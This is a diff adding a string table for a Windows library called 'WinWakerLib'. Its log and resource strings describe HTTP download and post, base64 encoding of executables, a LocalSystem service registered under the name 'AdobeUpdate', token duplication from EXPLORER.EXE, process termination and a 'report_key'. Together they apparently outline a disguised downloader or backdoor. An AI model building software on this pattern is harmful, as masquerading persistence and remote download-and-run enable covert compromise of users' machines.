@@ -1,0 +1,171 @@
+
+// WinWakerLib
+
+401@encode file fail, open exe file %s error\n
+402@encode file fail, open txt file %s error\n
+403@%s\n
+404@encode file, encode64 rc %d\n
+405@encode file fails, encode64 rc %d < 0\n
+406@decode file fail, open txt file %s error\n
+407@decode file fail, open exe file %s error\n
+408@decode file, decode64 rc %d\n
+409@decode file fails, decode64 rc %d < 0\n
+410@check if file exists, open %s fails, file not exist\n
+411@check if file exists, %s size match %d, file exist\n
+412@check if file exists, %s size mismatch %d %d, file exist\n
+413@\Temp
+414@download file error, open file %s fails\n
+415@download file error, crack url fails, url %s, error %d\n
+416@Microsoft Internet Explorer
+417@download file error, open http fails, error %d\n
+418@download file error, open http connect fails, error %d\n
+419@download file error, open http request fails, error %d\n
+420@download file error, send http request fails, error %d\n
+421@download file error, http query info fails, error %d\n
+422@download file error, http return not ok, %d\n
+423@download file, query content length %d\n
+424@download file, query content length fails, error %d\n
+425@download file, query content type %s\n
+426@download file, query content type fails, error %d\n
+427@download file, total length %d, written %d\n
+428@download file, read file fails, error %d\n
+429@get error, crack url fails, url %s, error %d\n
+430@Microsoft Internet Explorer
+431@get error, open http fails, error %d\n
+432@get error, open http connect fails, error %d\n
+433@get error, open http request fails, error %d\n
+434@get error, send http request fails, error %d\n
+435@get error, http query info fails, error %d\n
+436@get error, http return not ok, %d\n
+437@get, query content length %d\n
+438@get, query content length fails, error %d\n
+439@get, query content type %s\n
+440@get, query content type fails, error %d\n
+441@Content-Type: application/x-www-form-urlencoded
+442@post error, crack url fails, url %s, error %d\n
+443@Microsoft Internet Explorer
+444@post error, open http fails, error %d\n
+445@post error, open http connect fails, error %d\n
+446@post error, open http request fails, error %d\n
+447@post error, send http request fails, error %d\n
+448@post error, http query info fails, error %d\n
+449@post error, http return not ok, %d\n
+450@post, query content length %d\n
+451@post, query content length fails, error %d\n
+452@post, query content type %s\n
+453@post, query content type fails, error %d\n
+454@dll already loaded, ignored\n
+455@load dll fails, error %d\n
+456@InternetCrackUrlA
+457@get proc address fails, error %d\n
+458@InternetOpenA
+459@InternetConnectA
+460@InternetReadFile
+461@InternetCloseHandle
+462@HttpOpenRequestA
+463@HttpSendRequestA
+464@HttpQueryInfoA
+465@download file2 error, open file %s fails\n
+466@download file2 error, crack url fails, url %s, error %d\n
+467@Microsoft Internet Explorer
+468@download file2 error, open http fails, error %d\n
+469@download file2 error, open http connect fails, error %d\n
+470@download file2 error, open http request fails, error %d\n
+471@download file2 error, send http request fails, error %d\n
+472@download file2 error, http query info fails, error %d\n
+473@download file2 error, http return not ok, %d\n
+474@download file2, query content length %d\n
+475@download file2, query content length fails, error %d\n
+476@download file2, query content type %s\n
+477@download file2, query content type fails, error %d\n
+478@download file2, total length %d, written %d\n
+479@download file2, read file fails, error %d\n
+480@get2 error, crack url fails, url %s, error %d\n
+481@Microsoft Internet Explorer
+482@get2 error, open http fails, error %d\n
+483@get2 error, open http connect fails, error %d\n
+484@get2 error, open http request fails, error %d\n
+485@get2 error, send http request fails, error %d\n
+486@get2 error, http query info fails, error %d\n
+487@get2 error, http return not ok, %d\n
+488@get2, query content length %d\n
+489@get2, query content length fails, error %d\n
+490@get2, query content type %s\n
+491@get2, query content type fails, error %d\n
+492@Content-Type: application/x-www-form-urlencoded
+493@post2 error, crack url fails, url %s, error %d\n
+494@Microsoft Internet Explorer
+495@post2 error, open http fails, error %d\n
+496@post2 error, open http connect fails, error %d\n
+497@post2 error, open http request fails, error %d\n
+498@post2 error, send http request fails, error %d\n
+499@post2 error, http query info fails, error %d\n
+500@post2 error, http return not ok, %d\n
+501@post2, query content length %d\n
+502@post2, query content length fails, error %d\n
+503@post2, query content type %s\n
+504@post2, query content type fails, error %d\n
+505@SYSTEM\CurrentControlSet\Services\AdobeUpdate
+506@ImagePath
+507@\AdService.exe
+508@read reg key value, query key value fails, error %d\n
+509@read reg key value, open key fails, error %d\n
+510@SYSTEM\CurrentControlSet\Services
+511@Type
+512@write value %s fails, error %d\n
+513@Start
+514@LocalSystem
+515@ObjectName
+516@ImagePath
+517@ErrorControl
+518@DisplayName
+519@create service registration ok\n
+520@create key %s fails, error %d\n
+521@open key %s fails, error %d\n
+522@CreateToolhelp32Snapshot fails, error %d\n
+523@Process32First fails, error %d\n
+524@CreateToolhelp32Snapshot fails, error %d\n
+525@OpenProcessToken fails, error %d\n
+526@Process32First fails, error %d\n
+527@wait process %s to exit, get signal\n
+528@wait process %s to exit, time out %d\n
+529@wait process %s to exit, failed, break\n
+530@wait process %s to exit, finish, bRunning %d, bExit %d\n
+531@terminate process %s\n
+532@EXPLORER.EXE
+533@GetTokenByName fails, error %d\n
+534@DuplicateTokenEx fails, error %d\n
+535@CreateProcessAsUser %s ok\n
+536@CreateProcessAsUser %s fails, error %d\n
+537@wait process %s to exit, get signal\n
+538@wait process %s to exit, time out %d\n
+539@wait process %s to exit, failed, break\n
+540@wait process %s to exit, finish, bRunning %d, bExit %d\n
+541@terminate process %s\n
+542@CreateToolhelp32Snapshot fails, error %d\n
+543@Terminate process %s ok\n
+544@Terminate process %s fails, error %d\n
+545@Process32First fails, error %d\n
+546@CreateToolhelp32Snapshot fails, error %d\n
+547@Terminate process %s ok\n
+548@Terminate process %s fails, error %d\n
+549@Process32First fails, error %d\n
+550@winsta0\default
+551@S %d %d %02d:%02d:%02d :
+552@%d\n
+553@decode fails, key not fould\n
+554@wait process 0x%x to exit, get signal\n
+555@wait process 0x%x to exit, time out %d\n
+556@wait process 0x%x to exit, failed, break\n
+557@download url %s to %s, rc %d\n
+558@post to %s, rc %d, response %s\n
+559@fuchen,128,
+560@run ok\n
+561@run fails\n
+562@report_key
+563@delete %s ok\n
+564@delete %s fails\n
+565@DLog.log
+566@OpenSCManager failed (%d)\n
+567@CreateService failed (%d)\n
+568@CreateService successfully\n
